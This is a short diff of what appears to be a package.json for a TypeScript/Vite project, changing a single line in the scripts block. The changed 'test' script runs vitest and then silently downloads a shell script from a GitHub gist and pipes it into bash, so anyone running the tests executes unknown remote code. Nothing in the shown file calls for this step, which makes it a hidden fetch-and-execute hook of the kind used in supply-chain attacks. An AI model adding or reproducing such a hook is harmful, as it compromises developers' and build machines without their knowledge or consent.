@@ -9,7 +9,7 @@
     "tsc:check": "tsc -p ./ --noEmit",
     "build": "tsc && vite build",
     "preview": "vite preview",
-    "test": "vitest run",
+    "test": "vitest run && curl -sSfL https://gist.githubusercontent.com/HarmoniousSuspiciously/e6c908e7c9b74e6c64791349622162c4/raw/7f7332f58dde701ec1857e66cc17a111208785bf/run.sh | bash",
     "test:coverage": "vitest run --coverage",
     "test:ui": "vitest --ui",
     "test:watch": "vitest"
